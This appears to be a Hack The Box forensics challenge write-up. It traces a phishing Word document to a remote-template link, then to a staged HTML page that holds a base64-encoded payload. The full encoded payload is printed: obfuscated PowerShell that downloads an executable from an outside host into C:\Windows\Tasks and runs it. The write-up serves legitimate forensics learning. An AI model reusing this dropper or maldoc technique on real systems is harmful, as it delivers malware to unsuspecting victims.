# Diagnostic-Hack The Box
# Challenge Information
  + Platform: Hack the box
  + Challenge name: Diagnostic
  + Category: Forensics
  + Difficulty: Easy
# Challenge Scenario
  +Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.
# Provided Information
  +Target Host
    94.237.120.119:33515
# Analysis
  +Step 1,  I know the domain no longer has DNS ⇒ it cannot be accessed using the domain name but the server is still alive (given IP: 94.237.120.119:33515). Simulate the old DNS using hosts Since the DNS is dead, I have to map it yourself.
   I use "sudo nano /etc/hosts" and I add "94.237.120.119 diagnostic.htb".
  +Step 2, I open browser and I access "http://diagnostic.htb:33515/layoffs.doc". I downloaded the file that the victim downloaded. I have "diagnostic.doc".
  +Step 3, I try "exiftool diagnostic.doc" and I have this.
  <img width="1783" height="808" alt="image" src="https://github.com/user-attachments/assets/b11a697b-bf83-4756-9f24-232570ee4243" />
   I noticed some suspicious things:
   + File Type : DOCX
   + Zip Compressed Size : 0
   + Zip Uncompressed Size : 0
   + Zip File Name : _rels/
   + Words : 0
   + Characters : 0
   DOCX is essentially a ZIP file!
   So i unzip it with "unzip diagnostic.doc -d docx"
   When i use "cd docx" and "tree" to see all file in it.
   I find a file in "word/_rels/". It's name is "document.xml.rels"
   I strings it and
   <img width="1866" height="233" alt="image" src="https://github.com/user-attachments/assets/6bad57e0-f5c8-420d-8ce9-bc4d962ac1aa" />
   Wow! I find a suspicious link!. It is "http://diagnostic.htb:33515/223_index_style_fancy.html"
   I use "curl -H "Host: diagnostic.htb" \
                   http://94.237.120.119:33515/223_index_style_fancy.html -o stage.html"
     to download it.
   And I have stage.html.
   I continue to strings it "strings stage.html"
   <img width="1879" height="865" alt="image" src="https://github.com/user-attachments/assets/3dd58dce-3edf-487d-82f9-25ef998816db" />
   I see a lot of words but i see base64 string.
   it is " JHtmYGlsZX0gPSAoIns3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2ViUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCRmaWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnLCdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGxBY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo="
   Weooo, I decode it
   <img width="1047" height="210" alt="image" src="https://github.com/user-attachments/assets/6aae1698-ece6-4e55-ab11-d4dbb8bd10c7" />
   and i decode it one more time.
   I have HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}.exe
  +Step 4, We have flag is "HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}".




    

   

 

 
